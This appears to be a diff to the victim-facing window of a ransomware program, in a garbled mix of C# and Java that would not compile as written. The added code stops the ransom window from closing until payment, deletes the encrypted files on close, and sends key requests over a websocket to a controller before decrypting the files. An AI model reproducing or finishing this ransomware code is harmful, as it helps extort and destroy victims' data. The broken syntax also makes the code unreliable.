@@ -201,7 +201,20 @@ public class RansomwareDisplay extends System.Windows.Forms.Form
 
 	private void RansomwareDisplay_FormClosing(Object sender, FormClosingEventArgs e)
 	{
-
+		if (HasPaid)
+        {
+            if (MessageBox.Show("Are you sure you want to lose your files?", "Emmy", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
+            {
+				for (String path; Globals.Encrypted; )
+				{
+					File.Delete(path);
+				}
+            }
+        }
+        else
+        {
+            e.set_Cancel(true);  
+        }
 	}
 
 	private void RansomwareDisplay_Load(Object sender, System.EventArgs e)
@@ -216,6 +229,72 @@ public class RansomwareDisplay extends System.Windows.Forms.Form
             "Frick Lol Piggy Bank Man"
         };
 		label3.set_Text(array[new Random().Next(array.length - 1)]);
-		SoundPlayer soundplyr = new SoundPlayer(Resources.get_sonauto_generation_3);
+	}
+
+    public String toString() {
+        return "Tuple [item1=" + item1 + ", item2=" + item2 + "]";
+    }
+
+	private void button1_Click(Object sender, EventArgs e)
+	{
+		Globals.ws.Send(JsonConvert.DeserializeObject((String)(Object)new Globals.cmd("private_key", textBox1.get_Text())));
+        int num = MessageBox.Show("Delocking Attempt", "Delocker");
+		for (String str; Globals.Encrypted; )
+		{
+			try
+			{
+				if (Globals.Passwords.PrivatePassword != null)
+				{
+					HasPassword = true;
+					Console.WriteLine("Delocking " + str);
+					Tuple<byte[], byte[]> encoded = JsonConvert.DeserializeObject(new TypeToken<Tuple<byte[], byte[]>>() { }.getType(), File.ReadAllText(str));
+					File.WriteAllBytes(str, LockerEngine.Decrypt_File_AESRSA(encoded, Globals.Passwords.PrivatePassword));
+					File.Move(str, Path.ChangeExtension(str, null));
+				}
+				else
+				{
+					HasPassword = false;
+					break;
+				}
+			}
+			catch (Exception ex)
+			{
+				MessageBox.Show(ex.get_Message(), ex.get_Source(), MessageBoxButtons.OK, MessageBoxIcon.Error);
+			}
+		}
+	}
+
+	private void RansomwareDisplay_Shown(Object sender, EventArgs e)
+	{
+		richTextBox1.set_Text(Globals.Encrypted.toString());
+	}
+
+	private void button2_Click(Object sender, EventArgs e)
+	{
+		Globals.ws.Send(JsonConvert.SerializeObject(new Globals.cmd("private_key", "key")));
+        int num = MessageBox.Show("Delocking Attempt", "Delocker Password");
+		for (String str; Globals.Encrypted; )
+		{
+			try
+			{
+				if (Globals.Passwords.PrivatePassword != null)
+				{
+					HasPassword = true;
+					Console.WriteLine("Delocking " + str);
+					Tuple<byte[], byte[]> encoded = JsonConvert.DeserializeObject(new TypeToken<Tuple<byte[], byte[]>>() { }.getType(), File.ReadAllText(str));
+					File.WriteAllBytes(str, EncryptionEngine.Decrypt_File_AESRSA(encoded, Globals.Passwords.PrivatePassword));
+					File.Move(str, Path.ChangeExtension(str, null));
+				}
+				else
+				{
+					HasPassword = false;
+					break;
+				}
+			}
+			catch (Exception ex)
+			{
+				MessageBox.Show(ex.get_Message(), ex.get_Source(), MessageBoxButtons.OK, MessageBoxIcon.Error);
+			}
+		}
 	}
 }
